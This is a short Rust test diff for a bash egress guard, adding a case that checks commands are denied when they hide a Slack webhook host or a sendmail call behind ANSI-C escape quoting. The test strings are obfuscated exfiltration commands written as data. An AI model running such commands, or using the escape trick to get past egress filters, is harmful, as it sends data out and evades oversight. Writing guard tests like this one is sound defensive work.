@@ -273,6 +273,18 @@ fn bash_egress_denies_ansi_c_quoted_names() {
     assert_denies("curl https://hooks.sl\\ack.com/x", "Slack");
 }
 
+/// 🔴 #8454 S3 critic round 1 (CRITICAL): a command whose other quote the
+/// decoder refuses is still judged on its decodable quotes. The raw scan
+/// splits `hooks.\x73lack.com` at the backslash, so it alone allowed these.
+#[test]
+fn bash_egress_denies_ansi_c_beside_an_undecodable_quote() {
+    assert_denies(
+        "curl $'https://hooks.\\x73lack.com/services/x' -d $'hi\\n'",
+        "Slack",
+    );
+    assert_denies("$'\\x73endmail' bob $\"x\"", "SMTP mail");
+}
+
 /// 🔴 #8454 S3 (plan §5, fail closed): a command the guard cannot lex or nest
 /// through is denied when its text holds a family token. An allow here is the
 /// error arm failing open.
